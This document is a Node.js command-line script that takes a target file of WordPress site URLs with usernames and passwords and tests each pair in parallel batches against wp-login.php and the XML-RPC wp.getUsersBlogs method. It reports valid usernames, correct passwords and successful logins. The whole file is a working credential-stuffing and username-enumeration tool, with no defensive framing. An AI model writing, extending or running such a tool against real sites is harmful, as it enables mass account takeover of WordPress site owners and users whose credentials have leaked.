const { Command } = require('commander');
const program = new Command();
const fs = require('fs/promises');
const {default: axios} = require('axios');
const urlParser = require('node:url');
const util = require('util');
const xmlrpc = require('xmlrpc');
const qs = require('node:querystring');
const _ = require('lodash');

const DefaultNReq = 10;

function createXmlClient(hostname, protocol) {
	const xmlrpcOptions = {
		host: hostname,
		port: protocol === 'https:' ? 443 : 80, // NOTE: protocol comes with semicolon (:)
		path: '/xmlrpc.php'
	};
	
	const client = xmlrpcOptions.port === 443 ? 
		xmlrpc.createSecureClient(xmlrpcOptions) : 
		xmlrpc.createClient(xmlrpcOptions);

	client.methodCall = util.promisify(client.methodCall.bind(client));
	return client;
}



async function wpLogin(host, protocol, username, password) {
	const payload = qs.stringify({
		log: username,
		pwd: password,
		testcookie: '1',
		'wp-submit': 'Log In',
		redirect_to: `${protocol}//${host}/wp-admin`
	});
	
	const result = {
		usernameOk: false,
		passwordOk: false,
		loggedIn: false
	};
	try {
		const response = await axios.post(
			`${protocol}//${host}/wp-login.php`, 
			payload,
			{
				maxRedirects: 0,
				validateStatus: function (status) {
					// if this function returns true, exception is not thrown, so
					// in simplest case just return true to handle status checks externally.
					return true;
				},
				headers: {
					Cookie: `wordpress_test_cookie=WP%20Cookie%20check`,
				}
			}
		);
		//console.log(response.data);
		const reNoUser = new RegExp(`The username <strong>${username}</strong> is not registered on this site`);
		const usernameIsNotRegistered = response.data.match(reNoUser) !== null;
		//console.log(`username not registered: ${usernameIsNotRegistered}`);
		const reInvalidPass = new RegExp(`The password you entered for the username <strong>${username}</strong> is incorrect`);
		const passwordIsInvalid = response.data.match(reInvalidPass) !== null;
		//console.log(`password is invalid: ${passwordIsInvalid}`);
		const {headers} = response;
		const loggedIn = headers['set-cookie'] !== undefined && headers['set-cookie'].find(c=>c.match("wordpress_logged_in")) !== undefined;
		result.loggedIn = loggedIn;
		result.usernameOk = !usernameIsNotRegistered;
		result.passwordOk = !passwordIsInvalid;
	} catch(err) {}

	return result;
}




async function run(pathToTargets, nParrallelRequests) {

	const contents = await fs.readFile(pathToTargets, {encoding: 'utf8'});
	const lines = contents.split(/\r\n?|\n/).filter(line=>line.startsWith('http'));
	// console.log(lines);
	const nBulks = lines.length % nParrallelRequests === 0 ? 
		lines.length / nParrallelRequests :
		Math.trunc(lines.length / nParrallelRequests) + 1;
	
	console.log(`nBulks: ${nBulks}, nReq: ${nParrallelRequests}`);
	for (let i=0; i<nBulks; i++) {
		const wpLoginPromises = [];
		const getUsersBlogsPromises = [];
		const startIdx = i*nParrallelRequests;
		const endIdx = Math.min(lines.length, startIdx + nParrallelRequests);
		
		console.log(`bulk: ${i}, startIdx: ${startIdx} endIdx: ${endIdx}`);
		for (let j=startIdx; j<endIdx; j++) {
			// console.log(`working on line: ${j}`);
			const [url, username, password] = lines[j].split(';');
			const {host, hostname, protocol} = new urlParser.URL(url);
			wpLoginPromises.push(wpLogin(host, protocol, username, password).catch(e=>e));
			const xmlClient = createXmlClient(hostname, protocol);
			getUsersBlogsPromises.push(xmlClient.methodCall('wp.getUsersBlogs', [username, password]).catch(e=>e));
		}

		// Note: if ERROR 'Unknown tag TITLE' or similar is returned to XMLRPC request that means the /xmlrpc.php page is forbidden.
		// It's not forbidden by Wordpress but by web server. When XMLRPC is forbidden by Wordpress plugin,
		// there is XML error.
		const getUsersBlogsResults = await Promise.allSettled(getUsersBlogsPromises);
		const wpLoginResults = await Promise.allSettled(wpLoginPromises);

		
		for (let j=0; j<getUsersBlogsPromises.length; j++) {
			const k = i*nParrallelRequests + j;
			const line = lines[k];
			const wpLoginResult = wpLoginResults[j].value;
			const xmlLoginResult = getUsersBlogsResults[j].value.errno === undefined
			const report = `login|${line}|${wpLoginResult.usernameOk}|${wpLoginResult.passwordOk}|${wpLoginResult.loggedIn}|${xmlLoginResult}`;
			console.log(report);
		}

	}
}

program
	.requiredOption('-t, --targets <string>', 'path to file with the target lines')
	.option('-n, --requests <number>', 'parallel requests to launch', DefaultNReq)
	.action(async ({targets, requests})=>{
		await run(targets, requests);
	});


async function main() {
	await program.parseAsync(process.argv);
}

main()